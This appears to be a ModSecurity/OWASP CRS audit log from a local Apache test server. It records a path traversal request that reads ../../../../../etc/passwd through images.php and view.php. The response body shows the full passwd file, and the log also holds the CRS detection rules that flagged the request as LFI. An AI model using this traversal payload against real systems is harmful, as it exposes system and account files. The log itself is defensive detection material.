Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/images/red_vineyards.jpg"] [unique_id "aVzVGive669-ZtWihkUyOgAAAAQ"]
Stopwatch: 1767691546627679 7085 (- - -)
Stopwatch2: 1767691546627679 7085; combined=2330, p1=799, p2=980, p3=29, p4=83, p5=439, sr=100, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--c630e167-Z--

--c630e167-A--
[06/Jan/2026:14:30:30.020396 +0500] aVzWNmLm1Ko6nAjfB6CuegAAAAU 172.17.0.1 47440 172.17.0.2 80
--c630e167-B--
GET /images.php?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:9090/images.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--c630e167-F--
HTTP/1.1 302 Found
Location: http://127.0.0.1:9090/view.php?image=../../../../../etc/passwd
Content-Length: 2149
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

--c630e167-E--
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Images</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>

<body>
    <div class="container mt-5">
        <h1 class="text-center">View an Image</h1>
        <form action="" class="form-group">
            <div class="input-group mb-3">
                <input type="text" id="file" name="file" class="form-control mt-3" placeholder="Enter file name">
                <div class="input-group-append">
                    <input type="submit" value="Submit" class="btn btn-primary mt-3">
                </div>
            </div>
        </form>
                <div class="row">
            <div class="col-4">
                <img src="images/starry_night.jpg" alt="image1" class="img-fluid rounded">
                <p class="text-center mt-3">starry_night.jpg</p>
            </div>
            <div class="col-4">
                <img src="images/almond_blossom.jpg" alt="image2" class="img-fluid rounded">
                <p class="text-center mt-3">almond_blossom.jpg</p>
            </div>
            <div class="col-4">
                <img src="images/red_vineyards.jpg" alt="image3" class="img-fluid rounded">
                <p class="text-center mt-3">red_vineyards.jpg</p>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>

</html>
--c630e167-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: %2F..%2F found within REQUEST_URI_RAW: /images.php?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /images.php?file=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /images.php?file=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Matched phrase "etc/passwd" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "98"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"]
Message: Warning. Matched phrase "etc/passwd" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "501"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"]
Message: Warning. Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "94"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 43)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
Message: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "92"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 43 - SQLI=0,XSS=0,RFI=0,LFI=35,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 43, 0, 0, 0"] [ver "OWASP_CRS/3.3.5"] [tag "event-correlation"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "^[\\\\\\\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?i)(?:\\\\\\\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\\\\\\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: %2F..%2F found within REQUEST_URI_RAW: /images.php?file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?i)(?:\\\\\\\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\\\\\\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /images.php?file=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /images.php?file=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Pattern match "(?:^|[\\\\\\\\/])\\\\\\\\.\\\\\\\\.(?:[\\\\\\\\/]|$)" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "98"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Matched phrase "etc/passwd" at ARGS:file. [file "/usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"] [line "501"] [id "932160"] [msg "Remote Command Execution: Unix Shell Code Found"] [data "Matched Data: etc/passwd found within ARGS:file: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-shell"] [tag "platform-unix"] [tag "attack-rce"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/88"] [tag "PCI/6.5.2"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "94"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 43)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Error: [file "apache2_util.c"] [line 275] [level 3] [client 172.17.0.1] ModSecurity: Warning. Operator GE matched 5 at TX:inbound_anomaly_score. [file "/usr/share/modsecurity-crs/rules/RESPONSE-980-CORRELATION.conf"] [line "92"] [id "980130"] [msg "Inbound Anomaly Score Exceeded (Total Inbound Score: 43 - SQLI=0,XSS=0,RFI=0,LFI=35,RCE=5,PHPI=0,HTTP=0,SESS=0): individual paranoia level scores: 43, 0, 0, 0"] [ver "OWASP_CRS/3.3.5"] [tag "event-correlation"] [hostname "127.0.0.1"] [uri "/images.php"] [unique_id "aVzWNmLm1Ko6nAjfB6CuegAAAAU"]
Apache-Handler: application/x-httpd-php
Stopwatch: 1767691830015500 4942 (- - -)
Stopwatch2: 1767691830015500 4942; combined=3106, p1=787, p2=1756, p3=29, p4=378, p5=156, sr=114, sw=0, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.7 (http://www.modsecurity.org/); OWASP_CRS/3.3.5.
Server: Apache/2.4.58 (Ubuntu)
Engine-Mode: "DETECTION_ONLY"

--c630e167-Z--

--49e1f51a-A--
[06/Jan/2026:14:30:30.026921 +0500] aVzWNmLm1Ko6nAjfB6CuewAAAAU 172.17.0.1 47440 172.17.0.2 80
--49e1f51a-B--
GET /view.php?image=../../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1:9090
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Referer: http://127.0.0.1:9090/images.php
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6

--49e1f51a-F--
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 381
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

--49e1f51a-E--
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:100:101:MySQL Server,,,:/nonexistent:/bin/false

--49e1f51a-H--
Message: Warning. Pattern match "^[\\d.:]+$" at REQUEST_HEADERS:Host. [file "/usr/share/modsecurity-crs/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"] [line "736"] [id "920350"] [msg "Host header is a numeric IP address"] [data "127.0.0.1:9090"] [severity "WARNING"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-protocol"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/210/272"] [tag "PCI/6.5.10"]
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at REQUEST_URI_RAW. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI_RAW: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?i)(?:\\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8 ..." at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "48"] [id "930100"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at REQUEST_URI. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: /../ found within REQUEST_URI: /view.php?image=../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Pattern match "(?:^|[\\/])\\.\\.(?:[\\/]|$)" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "72"] [id "930110"] [msg "Path Traversal Attack (/../)"] [data "Matched Data: ../ found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"]
Message: Warning. Matched phrase "etc/passwd" at ARGS:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf"] [line "98"] [id "930120"] [msg "OS File Access Attempt"] [data "Matched Data: etc/passwd found within ARGS:image: ../../../../../etc/passwd"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.5"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-lfi"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/255/153/126"] [tag "PCI/6.5.4"]
